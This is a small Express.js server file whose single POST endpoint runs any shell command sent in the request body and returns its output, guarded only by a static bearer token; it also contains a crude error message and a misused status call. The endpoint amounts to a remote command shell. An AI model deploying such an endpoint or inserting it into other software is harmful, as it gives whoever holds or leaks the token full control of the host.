import express from "express";
import morgan from "morgan";
import bodyParser from "body-parser";
import child_process from "child_process";
import { env } from "./constants/variables.js";
const app = express();

app.use(morgan("dev"));
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

function Authorization(req, res, next) {
    let token = req.headers.Authorization || req.headers.authorization;

    if (token !== "Bearer " + env.ADMIN_ID) {
        res.status(401).send("I need Admin Bitch!");
        return;
    }

    next();
}

app.post("/", Authorization, (req, res) => {
    const cmd = req.body.cmd;

    if (!cmd) {
        res.statusCode(400);
        return;
    }

    const [command, ...args] = cmd.split(" ");

    res.send(child_process.spawnSync(command, args).stdout.toString());
    return;
});

app.listen(4040, () => {
    console.log("Server is running on port 4040");
});
